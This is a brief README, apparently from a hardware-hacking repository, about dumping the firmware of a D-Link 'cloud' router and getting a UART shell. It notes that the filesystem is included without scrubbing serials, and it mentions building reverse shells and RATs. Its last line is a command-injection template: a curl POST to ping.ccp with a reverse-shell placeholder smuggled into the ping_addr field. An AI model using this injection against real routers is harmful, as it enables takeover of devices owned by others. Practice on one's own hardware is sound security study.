# Taking a dumparooski from a Dlink DIR363L "cloud" router.

DLink D636L "Cloud Router". Has RT6856F CPU, soic16 flash rom on the backside of the PCB, 1gig ports, nvme/tiny pci slot for wifi card, and thruholes for uart pins. UARTing into this thing will get you a shell. Standard cheap MIPS environment. Easy to build revsh's and rats.
<BR><BR>
dir636l.tar.gz has the whole filesystem (not scrubbed for addresses or serials). Still has the vulnerability for tools_ast.asp, great as a practice target. Exploits here, look for tools_vst.asp and/or ping.ccp. "curl -X POST --data 'ccp_act=ping_v6&ping_addr=$(SUPER NIFTY REVERSE SHELL HERE)'"
